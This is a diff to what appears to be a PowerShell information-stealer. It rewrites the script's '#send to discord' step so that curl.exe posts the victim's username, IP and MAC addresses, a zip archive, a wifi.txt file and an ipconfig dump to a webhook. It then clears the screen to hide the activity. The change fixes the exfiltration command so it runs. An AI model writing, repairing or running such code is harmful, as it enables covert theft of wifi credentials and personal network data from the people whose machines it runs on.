@@ -22,12 +22,22 @@ $ipv6 = (Get-NetIPAddress -AddressFamily IPv6).IPAddress
 #send to discord
 
 #send http
-Start-Process curl.exe -X POST `
-  -F "content=$($whoami_content) |$info = "IPS: $($ipv4 -join ', ') | MACS: $($mac -join ', ') | IPv6: $($ipv6 -join ', ') | @everyone" `
-  -F "file1=@$zip" `
-  -F "file2=@$e\wifi.txt" `
-  -F "file3=@$e\ipcfg.txt" `
-  $wh *> $null   
+# Build info line first
+$info = "IPS: $($ipv4 -join ', ') | MACS: $($mac -join ', ') | IPv6: $($ipv6 -join ', ')"
+
+# Combine with username
+$content = "$($whoami_content) | $info | @everyone"
+
+# Send webhook
+Start-Process curl.exe -ArgumentList @(
+    '-X', 'POST',
+    '-F', "content=$content",
+    '-F', "file1=@$zip",
+    '-F', "file2=@$e\wifi.txt",
+    '-F', "file3=@$e\ipcfg.txt",
+    $wh
+) -NoNewWindow -Wait *> $null
+
 
 # cleanup
 cls
